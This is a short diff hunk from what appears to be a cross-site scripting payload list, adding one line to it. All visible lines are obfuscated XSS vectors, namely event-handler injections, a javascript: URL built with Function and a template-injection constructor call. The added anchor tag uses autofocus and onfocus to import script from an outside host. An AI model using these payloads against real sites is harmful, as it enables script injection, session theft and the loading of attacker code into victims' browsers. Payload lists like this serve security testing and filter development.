@@ -12,3 +12,4 @@
 asd"`> onpointerenter=x=prompt,x`XSS`
 javascript:new%20Function`al\ert\`1\``;
 {{constructor.constructor(alert`1`)()}}
+<A HRef=//site.com AutoFocus %26%2362 OnFocus%0C=import(href)>
